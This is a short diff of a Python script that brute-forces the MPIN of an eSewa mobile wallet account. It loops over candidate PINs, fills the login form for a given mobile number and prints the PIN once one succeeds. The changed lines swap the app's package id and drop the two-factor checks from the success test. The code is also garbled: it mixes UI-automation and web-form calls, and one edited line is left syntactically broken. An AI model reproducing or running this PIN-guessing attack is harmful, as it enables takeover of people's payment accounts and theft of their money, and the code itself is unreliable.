@@ -26,14 +26,14 @@ while True:
         continue
     print(str(i) + " : " + passw)
     try:
-        response = d(resourceId="com.esewa.android:id/toolbar_login/register").click()
+        response = d(resourceId="com.f1soft.esewa:id/toolbar_login/register").click()
         if response.code == 200:
             d.select_form(nr=0)
             d.form['MobileNumber'] = MobileNumber
             d.form['MPIN'] = passw
             response = d.submit()
             response_data = response.read()
-            if 'response_data' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
+            if 'response_data' in response_data
                 print('Your MPIN is:', passw)
                 break
     except Exception as e:
